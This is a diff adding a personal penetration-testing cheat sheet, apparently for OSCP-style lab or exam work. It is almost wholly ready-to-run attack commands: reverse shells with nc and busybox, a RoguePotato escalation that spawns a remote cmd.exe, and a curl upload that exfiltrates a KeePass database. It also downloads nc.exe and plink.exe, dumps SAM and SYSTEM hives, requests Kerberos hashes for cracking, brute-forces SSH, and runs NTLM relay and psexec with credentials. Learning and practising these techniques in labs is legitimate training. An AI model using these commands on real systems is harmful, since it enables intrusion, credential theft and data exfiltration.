@@ -1,0 +1,84 @@
+sudo nmap -Pn -p- -A -sV -T4 -sS --stats-every 5 192.168.234.150
+sudo nmap -Pn -sU -T4 --stats-every 5 192.168.234.150
+
+
+
+Tunnel
+Edit proxychains config: "socks5 127.0.0.1 1080"
+Server: chisel server --port 8080 --socks5 --reverse
+Client: .\chisel.exe client --max-retry-count 1 192.168.45.233:8080 R:socks
+One port: ./chisel client --max-retry-count 1 192.168.45.214:8080 R:8000:localhost:8000
+Execute commands with "proxychains -q" in front for reduced output verbosity
+
+Windows port forward
+netsh interface portproxy add v4tov4 listenport=4422 listenaddress=192.168.1.111 connectport=80 connectaddress=192.168.0.33
+
+After escalation to system on windows powershell:
+$ProgressPreference = "SilentlyContinue"
+
+Roguepotato
+.\RoguePotato.exe -r 192.168.45.203 -e "C:\Users\Public\nc.exe 192.168.45.203 3001 -e cmd.exe" -l 9999
+socat tcp-listen:135,reuseaddr,fork tcp:192.168.246.247:9999
+
+Power64
+pwsh power64.ps1 192.168.45.214 80 4444 true text
+
+sudo neo4j start
+visit http://localhost:7474 and change password
+bloodhound
+
+Curl upload
+curl.exe -i -F files=@C:\Users\jim\Documents\Database.kdbx http://192.168.45.154:8000/upload
+curl -X POST -i -F files=@hello.sh http://192.168.136.137/upload
+
+Busybox reverse shell
+busybox nc 192.168.45.214 4444 -e sh
+
+Privesc linux
+/bin/bash -p (after chmod u+s /bin/bash)
+
+Listen for pings
+sudo tcpdump -i tun0 icmp and icmp[icmptype]=icmp-echo
+
+Windows powershell curl
+iwr -UseBasicParsing -URI http://192.168.45.195/adduser.exe -OutFile backup.exe
+
+AD authentication (remember local/windows auth)
+evil-winrm -i 192.168.1.19 -u administrator -p password
+impacket-psexec test.local/john:password123@10.10.10.1
+impacket-ntlmrelayx --no-http-server -smb2support  -c "powershell -E
+smbclient -L 10.10.121.147 -U OSCP.exam\web_svc --password Diamond1
+smbclient \\\\10.10.121.146\\C$ -U oscp.exam/sql_svc
+crackmapexec <protocol> <target(s)> -u username -p password
+
+LSA dump manual
+reg save hklm\system SYSTEM
+reg save hklm\SAM SAM
+
+Watch process Windows
+Get-Process beyondupdater -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -Seconds 1
+
+ASREP/Kerberos
+impacket-GetNPUsers  -request -dc-ip 192.168.50.70 corp.com/pete
+impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
+
+Password cracking/brute forcing
+hydra -l username -P /usr/share/wordlists/rockyou.txt -s 22 ssh://192.168.
+hashcat -a 0 -m 13400 kdb.txt /usr/share/wordlists/rockyou.txt
+
+Upgrading shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+Gobuster
+gobuster dir -u http://192.168.239.223 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,pdf,jpg,png,txt,zip -t 100 -q
+gobuster dir -u http://192.168.239.223 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x aspx,html,pdf,jpg,png,txt,zip -t 100 -q
+
+Others
+nc 192.168.1.1 4444 -e /bin/bash
+NET LOCALGROUP "Remote Desktop Users" dave2 /ADD
+sc.exe start service
+wget -Uri http://192.168.45.187/plink.exe -OutFile C:\Windows\Temp\plink.exe
+Invoke-WebRequest -URI http://192.168.45.187/plink.exe -OutFile C:\Windows\Temp\plink.exe
+Invoke-WebRequest -URI http://192.168.45.187/nc.exe -OutFile C:\Windows\Temp\nc.exe
+C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.187
